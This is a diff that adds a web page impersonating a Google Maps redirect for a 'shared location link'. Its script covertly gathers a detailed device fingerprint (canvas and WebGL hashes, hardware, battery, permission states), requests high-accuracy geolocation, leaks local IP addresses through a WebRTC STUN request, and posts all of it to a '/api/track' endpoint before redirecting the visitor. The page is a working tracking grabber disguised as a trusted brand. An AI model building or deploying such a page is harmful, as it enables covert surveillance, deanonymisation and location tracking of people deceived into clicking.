@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Maps</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #202124;
+    }
+    .loader-container {
+      text-align: center;
+      padding: 2rem;
+    }
+    .map-icon {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 1.5rem;
+    }
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid #e8eaed;
+      border-top-color: #4285f4;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 1.5rem auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .title {
+      font-size: 1.1rem;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 0.5rem;
+    }
+    .subtitle {
+      font-size: 0.85rem;
+      color: #5f6368;
+    }
+    .error-container {
+      display: none;
+      text-align: center;
+      padding: 2rem;
+    }
+    .error-container h2 { color: #d93025; margin-bottom: 0.5rem; }
+    .error-container p { color: #5f6368; }
+  </style>
+</head>
+<body>
+  <div class="loader-container" id="loader">
+    <svg class="map-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M32 4C21.5 4 13 12.5 13 23c0 13.5 19 37 19 37s19-23.5 19-37C51 12.5 42.5 4 32 4z" fill="#EA4335"/>
+      <circle cx="32" cy="23" r="8" fill="#fff"/>
+    </svg>
+    <div class="title">Redirecting to Google Maps...</div>
+    <div class="spinner"></div>
+    <div class="subtitle">Loading your destination</div>
+  </div>
+
+  <div class="error-container" id="error">
+    <h2>Link Expired</h2>
+    <p>This shared location link is no longer available.</p>
+  </div>
+
+  <script>
+    (async () => {
+      const linkId = window.location.pathname.split("/r/")[1];
+      if (!linkId) {
+        showError();
+        return;
+      }
+
+      let deviceInfo = {};
+      try {
+        deviceInfo = await collectWithTimeout();
+      } catch {}
+
+      try {
+        const res = await fetch("/api/track", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ id: linkId, deviceInfo }),
+        });
+        const data = await res.json();
+        if (data.destination) {
+          window.location.href = data.destination;
+        } else {
+          showError();
+        }
+      } catch {
+        showError();
+      }
+    })();
+
+    function showError() {
+      document.getElementById("loader").style.display = "none";
+      document.getElementById("error").style.display = "block";
+    }
+
+    function collectWithTimeout() {
+      return new Promise(async (resolve) => {
+        const d = {};
+        collectSync(d);
+
+        const timer = setTimeout(() => resolve(d), 7000);
+
+        await Promise.allSettled([
+          collectBattery(d),
+          collectGeo(d),
+          collectWebRTC(d),
+          collectMedia(d),
+          collectPermissions(d),
+          collectStorage(d),
+        ]);
+
+        clearTimeout(timer);
+        resolve(d);
+      });
+    }
+
+    function collectSync(d) {
+      d.userAgent = navigator.userAgent;
+      d.platform = navigator.platform;
+      d.vendor = navigator.vendor;
+      d.language = navigator.language;
+      d.languages = [...(navigator.languages || [])];
+      d.cpuCores = navigator.hardwareConcurrency;
+      d.deviceMemory = navigator.deviceMemory;
+      d.maxTouchPoints = navigator.maxTouchPoints;
+      d.doNotTrack = navigator.doNotTrack;
+      d.cookieEnabled = navigator.cookieEnabled;
+      d.online = navigator.onLine;
+      d.webdriver = navigator.webdriver;
+      d.pdfViewer = navigator.pdfViewerEnabled;
+
+      d.screen = {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation?.type,
+        angle: screen.orientation?.angle,
+      };
+      d.viewport = {
+        width: window.innerWidth,
+        height: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight,
+      };
+      d.devicePixelRatio = window.devicePixelRatio;
+
+      d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      d.timezoneOffset = new Date().getTimezoneOffset();
+      d.locale = Intl.DateTimeFormat().resolvedOptions().locale;
+      d.localTime = new Date().toISOString();
+
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        d.connection = {
+          type: conn.type,
+          effectiveType: conn.effectiveType,
+          downlink: conn.downlink,
+          rtt: conn.rtt,
+          saveData: conn.saveData,
+        };
+      }
+
+      try {
+        const c = document.createElement("canvas");
+        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if (gl) {
+          const ext = gl.getExtension("WEBGL_debug_renderer_info");
+          d.gpu = {
+            vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : null,
+            renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null,
+            version: gl.getParameter(gl.VERSION),
+            shadingLang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+            maxViewportDims: Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)),
+            extensions: gl.getSupportedExtensions()?.length,
+          };
+        }
+      } catch {}
+
+      try {
+        const c = document.createElement("canvas");
+        c.width = 200;
+        c.height = 50;
+        const ctx = c.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("fp_canvas", 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText("fp_canvas", 4, 17);
+        const url = c.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < url.length; i++) {
+          hash = ((hash << 5) - hash + url.charCodeAt(i)) | 0;
+        }
+        d.canvasFingerprint = hash.toString(16);
+      } catch {}
+
+      try {
+        const actx = new (window.AudioContext || window.webkitAudioContext)();
+        d.audio = {
+          sampleRate: actx.sampleRate,
+          maxChannels: actx.destination.maxChannelCount,
+          state: actx.state,
+        };
+        actx.close();
+      } catch {}
+
+      d.preferences = {
+        colorScheme: matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
+        reducedMotion: matchMedia("(prefers-reduced-motion: reduce)").matches,
+        contrast: matchMedia("(prefers-contrast: more)").matches ? "more" : "normal",
+        forcedColors: matchMedia("(forced-colors: active)").matches,
+        pointer: matchMedia("(any-pointer: coarse)").matches
+          ? "coarse"
+          : matchMedia("(any-pointer: fine)").matches
+          ? "fine"
+          : "none",
+        hover: matchMedia("(any-hover: hover)").matches,
+      };
+
+      d.features = {
+        webSocket: "WebSocket" in window,
+        webRTC: "RTCPeerConnection" in window,
+        serviceWorker: "serviceWorker" in navigator,
+        webAssembly: "WebAssembly" in window,
+        sharedArrayBuffer: "SharedArrayBuffer" in window,
+        webGL2: !!document.createElement("canvas").getContext("webgl2"),
+        webGPU: "gpu" in navigator,
+        bluetooth: "bluetooth" in navigator,
+        usb: "usb" in navigator,
+        midi: "requestMIDIAccess" in navigator,
+        gamepad: "getGamepads" in navigator,
+        xr: "xr" in navigator,
+        speech: "speechSynthesis" in window,
+        payment: "PaymentRequest" in window,
+      };
+
+      if (performance.memory) {
+        d.memory = {
+          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+          totalJSHeapSize: performance.memory.totalJSHeapSize,
+          usedJSHeapSize: performance.memory.usedJSHeapSize,
+        };
+      }
+
+      d.referrer = document.referrer || null;
+      d.historyLength = history.length;
+      d.pluginsCount = navigator.plugins?.length || 0;
+    }
+
+    async function collectBattery(d) {
+      try {
+        const b = await navigator.getBattery();
+        d.battery = {
+          level: Math.round(b.level * 100),
+          charging: b.charging,
+          chargingTime: b.chargingTime,
+          dischargingTime: b.dischargingTime,
+        };
+      } catch {}
+    }
+
+    async function collectGeo(d) {
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 6000,
+            maximumAge: 0,
+          });
+        });
+        d.geolocation = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          altitude: pos.coords.altitude,
+          altitudeAccuracy: pos.coords.altitudeAccuracy,
+          heading: pos.coords.heading,
+          speed: pos.coords.speed,
+        };
+      } catch (e) {
+        d.geolocation = { error: e.message || "denied" };
+      }
+    }
+
+    function collectWebRTC(d) {
+      return new Promise((resolve) => {
+        try {
+          const ips = new Set();
+          const pc = new RTCPeerConnection({
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
+          });
+          pc.createDataChannel("");
+          pc.onicecandidate = (e) => {
+            if (!e.candidate) {
+              pc.close();
+              d.localIPs = [...ips];
+              resolve();
+              return;
+            }
+            const parts = e.candidate.candidate.split(" ");
+            if (parts.length >= 5) {
+              const ip = parts[4];
+              if (ip && ip !== "0.0.0.0") ips.add(ip);
+            }
+          };
+          pc.createOffer().then((o) => pc.setLocalDescription(o));
+          setTimeout(() => {
+            try { pc.close(); } catch {}
+            d.localIPs = [...ips];
+            resolve();
+          }, 3000);
+        } catch {
+          d.localIPs = [];
+          resolve();
+        }
+      });
+    }
+
+    async function collectMedia(d) {
+      try {
+        const devs = await navigator.mediaDevices?.enumerateDevices();
+        if (devs) {
+          d.mediaDevices = {
+            audioInputs: devs.filter((x) => x.kind === "audioinput").length,
+            audioOutputs: devs.filter((x) => x.kind === "audiooutput").length,
+            videoInputs: devs.filter((x) => x.kind === "videoinput").length,
+          };
+        }
+      } catch {}
+    }
+
+    async function collectPermissions(d) {
+      d.permissions = {};
+      const names = ["geolocation", "notifications", "camera", "microphone"];
+      for (const name of names) {
+        try {
+          const r = await navigator.permissions.query({ name });
+          d.permissions[name] = r.state;
+        } catch {}
+      }
+    }
+
+    async function collectStorage(d) {
+      try {
+        const est = await navigator.storage?.estimate();
+        if (est) d.storageEstimate = { quota: est.quota, usage: est.usage };
+      } catch {}
+    }
+  </script>
+</body>
+</html>
